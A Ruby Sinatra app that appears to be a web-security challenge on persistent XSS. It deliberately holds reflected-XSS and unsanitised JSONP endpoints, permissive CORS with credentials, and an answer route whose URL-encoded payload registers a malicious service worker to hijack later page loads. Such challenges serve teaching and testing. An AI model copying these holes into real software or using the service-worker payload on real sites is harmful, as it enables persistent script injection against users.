require 'rubygems'
require 'sinatra'


set :views, settings.root
set :public_folder, 'dist'

#set :show_exceptions, false

disable :sessions
#disable :protection

#index = File.open('dist/Sakurity.html')

get '/' do
  response.headers['Access-Control-Allow-Origin'] = '*'
  response.headers['Access-Control-Allow-Credentials'] = 'true'
  File.open('dist/Sakurity.html')
end



get '/xssanswer' do
  redirect 'https://clientsit.herokuapp.com/xss?user=%3Cscript%3E%0Anavigator.serviceWorker.register(%22%2Fjsonp%3Fcallback%3Donfetch%253Dfunction(e)%257B%250Ae.respondWith(new%2520Response(%27%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E%27%252C%257Bheaders%253A%2520%257B%27Content-Type%27%253A%27text%252Fhtml%27%257D%257D))%250A%257D%252F%252F%22).then(function(registration)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20successful%20with%20scope%3A%20%27%2C%20%20%20%20registration.scope)%3B%0A%7D).catch(function(err)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20failed%3A%20%27%2C%20err)%3B%0A%7D)%3B%0A%3C%2Fscript%3E'
end
# Try to get persistant XSS on https://clientsit.herokuapp.com/
# 1. The user loads the /xss link you crafted in Chrome
# 2. The user closes the tab and opens any other page
# 3. The user sees an alert.

get '/jsonp' do
  response.headers['content-type'] = 'text/javascript'
  "#{params[:callback]}(0)"
end

get '/a/b/c/jsonp' do
  response.headers['content-type'] = 'text/javascript'
  "#{params[:callback]}(0)"
end

get '/xss' do
  response.headers['x-xss-protection'] = '0;'

  "<html><body>Hello, #{params[:user]}</body></html>"
end

get '/xss2' do
  return x=<<HTML
<script>navigator.serviceWorker.register("/jsonp?callback=onfetch%3Dfunction(e)%7B%0Ae.respondWith(new%20Response('%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'%2C%7Bheaders%3A%20%7B'Content-Type'%3A'text%2Fhtml'%7D%7D))%0A%7D%2F%2F").then(function(registration) {  console.log('ServiceWorker registration successful with scope: ',    registration.scope);}).catch(function(err) {  console.log('ServiceWorker registration failed: ', err);});</script>
HTML
end